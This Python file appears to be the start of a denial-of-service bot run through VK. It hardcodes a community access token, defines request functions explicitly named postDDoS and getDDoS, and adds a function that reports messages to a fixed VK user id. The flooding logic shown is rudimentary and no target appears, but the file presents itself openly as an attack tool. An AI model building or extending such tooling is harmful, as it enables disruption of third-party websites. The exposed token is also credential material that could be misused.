import requests
from vk_api import VkApi
from vk_api.utils import get_random_id
from vk_api.longpoll import VkLongPoll, VkEventType
from getpass import getuser

token = '4691d8f6706204dafcf4410fb911a1e515b2dcfde010bd34940b4e4388499a0f6f1ff452c28d91003cfce'  # Community token
vk_session = VkApi(token=token)  # "Run" your community
vk = vk_session.get_api()  # Begin work with API

def postDDoS(url, data):
    r = requests.post(url, data=data)
    print(r.status_code)
    # Function that send POST requests

def getDDoS(url):
    r = requests.get(url)
    print(r.status_code)
    # Function that send GET requests

def message(message):

    vk.messages.send(
        peer_id = '300610283', # Your VK id
        message = message,
        random_id = get_random_id(),
    )
    # Function that send masseges